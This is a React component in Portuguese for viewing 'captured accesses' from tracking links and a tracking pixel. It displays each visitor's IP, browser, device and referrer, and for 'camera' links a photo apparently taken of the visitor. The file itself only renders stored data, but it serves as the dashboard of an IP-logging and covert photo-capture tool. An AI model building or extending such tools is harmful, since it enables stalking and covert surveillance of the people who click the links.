
import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { ArrowLeft, Trash2, Monitor, Smartphone, Globe, Camera, Wifi, Eye, X } from 'lucide-react';

interface AccessData {
  id: string;
  timestamp: string;
  ip: string;
  userAgent: string;
  referrer: string;
  type: 'link' | 'pixel';
  linkId?: string;
  linkType?: 'ip' | 'camera';
  photo?: string;
}

interface AccessViewerProps {
  accessData: AccessData[];
  onBack: () => void;
  onClearData: () => void;
}

const AccessViewer: React.FC<AccessViewerProps> = ({ accessData, onBack, onClearData }) => {
  const [selectedPhoto, setSelectedPhoto] = useState<string | null>(null);

  const getDeviceIcon = (userAgent: string) => {
    if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone')) {
      return <Smartphone className="h-4 w-4" />;
    }
    return <Monitor className="h-4 w-4" />;
  };

  const getAccessTypeIcon = (access: AccessData) => {
    if (access.type === 'pixel') {
      return <Globe className="h-4 w-4 text-purple-400" />;
    }
    if (access.linkType === 'camera') {
      return <Camera className="h-4 w-4 text-purple-400" />;
    }
    return <Wifi className="h-4 w-4 text-blue-400" />;
  };

  const getAccessTypeLabel = (access: AccessData) => {
    if (access.type === 'pixel') return 'Pixel';
    if (access.linkType === 'camera') return 'Câmera';
    return 'Link IP';
  };

  const formatDate = (timestamp: string) => {
    const date = new Date(timestamp);
    return date.toLocaleString('pt-BR');
  };

  const getBrowserName = (userAgent: string) => {
    if (userAgent.includes('Chrome')) return 'Chrome';
    if (userAgent.includes('Firefox')) return 'Firefox';
    if (userAgent.includes('Safari')) return 'Safari';
    if (userAgent.includes('Edge')) return 'Edge';
    return 'Desconhecido';
  };

  return (
    <>
      <div className="min-h-screen p-4">
        <div className="max-w-md mx-auto space-y-6">
          {/* Header */}
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Button
                onClick={onBack}
                variant="ghost"
                size="sm"
                className="text-white hover:bg-gray-800"
              >
                <ArrowLeft className="h-4 w-4" />
              </Button>
              <h1 className="text-xl font-bold text-white">Acessos Capturados</h1>
            </div>
            {accessData.length > 0 && (
              <Button
                onClick={onClearData}
                variant="destructive"
                size="sm"
              >
                <Trash2 className="h-4 w-4" />
              </Button>
            )}
          </div>

          {/* Stats */}
          <Card className="bg-gray-800 border-gray-700">
            <CardContent className="pt-6">
              <div className="grid grid-cols-3 gap-4 text-center">
                <div>
                  <div className="text-2xl font-bold text-white">{accessData.length}</div>
                  <div className="text-sm text-gray-400">Total</div>
                </div>
                <div>
                  <div className="text-2xl font-bold text-blue-400">
                    {accessData.filter(a => a.type === 'link' && a.linkType !== 'camera').length}
                  </div>
                  <div className="text-sm text-gray-400">Link IP</div>
                </div>
                <div>
                  <div className="text-2xl font-bold text-purple-400">
                    {accessData.filter(a => a.linkType === 'camera').length}
                  </div>
                  <div className="text-sm text-gray-400">Câmera</div>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Access List */}
          {accessData.length === 0 ? (
            <Card className="bg-gray-800 border-gray-700">
              <CardContent className="pt-6 text-center">
                <div className="text-gray-400">Nenhum acesso capturado ainda</div>
              </CardContent>
            </Card>
          ) : (
            <div className="space-y-3">
              {accessData.reverse().map((access) => (
                <Card key={access.id} className="bg-gray-800 border-gray-700">
                  <CardContent className="pt-4">
                    <div className="space-y-3">
                      {/* Header */}
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-2">
                          {getAccessTypeIcon(access)}
                          <Badge variant="secondary" className="text-xs">
                            {getAccessTypeLabel(access)}
                          </Badge>
                          {access.photo && (
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => setSelectedPhoto(access.photo!)}
                              className="h-6 px-2 text-xs"
                            >
                              <Eye className="h-3 w-3 mr-1" />
                              Foto
                            </Button>
                          )}
                        </div>
                        <div className="text-xs text-gray-400">
                          {formatDate(access.timestamp)}
                        </div>
                      </div>

                      {/* IP and Location */}
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-2">
                          <Globe className="h-4 w-4 text-green-400" />
                          <span className="text-white font-mono text-sm">{access.ip}</span>
                        </div>
                      </div>

                      {/* Device Info */}
                      <div className="flex items-center space-x-2">
                        {getDeviceIcon(access.userAgent)}
                        <span className="text-gray-300 text-sm">
                          {getBrowserName(access.userAgent)}
                        </span>
                      </div>

                      {/* Referrer */}
                      <div className="text-xs text-gray-400">
                        <span className="font-semibold">Origem:</span> {access.referrer}
                      </div>

                      {/* Link ID */}
                      {access.linkId && (
                        <div className="text-xs text-gray-500">
                          <span className="font-semibold">Link ID:</span> {access.linkId}
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}
        </div>
      </div>

      {/* Photo Modal */}
      {selectedPhoto && (
        <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4">
          <div className="bg-gray-800 rounded-lg max-w-md w-full">
            <div className="flex items-center justify-between p-4 border-b border-gray-700">
              <h3 className="text-white font-semibold">Foto Capturada</h3>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => setSelectedPhoto(null)}
                className="text-gray-400 hover:text-white"
              >
                <X className="h-4 w-4" />
              </Button>
            </div>
            <div className="p-4">
              <img
                src={selectedPhoto}
                alt="Foto capturada"
                className="w-full rounded-lg"
              />
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default AccessViewer;
